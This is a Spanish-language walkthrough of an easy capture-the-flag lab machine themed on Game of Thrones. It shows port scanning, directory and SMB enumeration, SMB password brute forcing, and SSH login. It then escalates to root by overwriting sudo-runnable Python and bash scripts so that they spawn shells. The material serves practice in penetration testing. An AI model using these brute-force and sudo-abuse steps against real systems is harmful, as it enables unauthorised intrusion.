---
description: '✍️ Autor: Zunderrub🔍 Dificultad: Fácil  📅 Fecha de creación: 16/07/2024'
---

# Winterfell

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más. También tenemos un servicio **SMB**.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web ambientada en la serie de Juego de Tronos.

Ahora buscaremos directorios y archivos con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Descubrimos un directorio que nos llama la atención que es `/dragon`.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos a indagar si tenemos acceso al servicio **SMB**.

```bash
smbclient -L 172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos a descubrir usuarios válidos para **SMB**.

```bash
enum4linux 172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Hemos descubierto un usuario **jon**. Teniendo en cuenta que la máquina trata de la serie posiblemente sea algún título una contraseña por lo que lo copiamos en un archivo y hacemos fuerza bruta.

```bash
crackmapexec smb 172.17.0.2 -u jon -p titulos.txt
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con esas credenciales descubiertas nos conectamos a SMB.

```bash
smbclient \\\\172.17.0.2\\shared -U jon
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Mostramos el contenido del archivo.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Decodificamos la contraseña que está en **base64**.

```bash
echo "aGlqb2RlbGFuaXN0ZXI=" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos conectamos con esas credenciales al usuario **jon**.

```bash
ssh jon@172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lo que hacemos es borrar el archivo y crear lo mismo pero con un contenido para tener una shell.

```bash
rm .mensaje.py
nano /home/jon/.mensaje.py
```

```bash
import os
os.system('/bin/bash')
```

```bash
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Los binarios que tenemos a nuestra disposición nos permiten leer y listar archivos que pertenecen a Daenerys. Por lo tanto, podemos suponer que uno de los pasos a seguir es explorar algún archivo en su directorio home. Primero, listamos el contenido del directorio y encontramos un archivo llamado `mensajeParajon`, que podría ser relevante para nuestras acciones.

```bash
sudo -u daenerys ls /home/daenerys
sudo -u daenerys cat /home/daenerys/mensajeParaJon
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con **daenerys** con la contraseña descubierta.

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lo primero que hacemos es leer el archivo y descubrimos que es un script en bash que establece una conexión con otra dirección IP. Sin embargo, al revisar los permisos, notamos que tenemos acceso a él. Por lo tanto, para escalar privilegios, solo necesitamos editar el archivo.

```bash
#!/bin/bash
bash
```

Ejecutamos.

```bash
sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
